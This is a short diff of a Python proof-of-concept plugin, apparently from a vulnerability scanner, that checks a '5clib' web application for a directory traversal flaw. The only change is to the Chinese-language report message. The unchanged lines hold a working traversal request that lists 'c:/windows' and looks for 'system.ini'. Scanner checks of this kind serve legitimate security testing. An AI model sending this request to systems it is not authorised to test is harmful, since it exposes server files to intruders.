@@ -58,7 +58,7 @@ class Poc(ABPoc):
             url = arg+"/5clib/kinweblistaction.action?filePath=&kind=disc&curpage=1&actionName=&subkind=c:/windows&doAction=second&pagesize=20&curPage=1&toPage="
             code, head, res2, errcode, _ = hh.http(url, post)
             if code == 200 and "system.ini" in res2:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞;文件遍历url={url}'.format(
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n文件遍历漏洞地址为{url}'.format(
                     target=self.target, name=self.vuln.name, url=url))
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
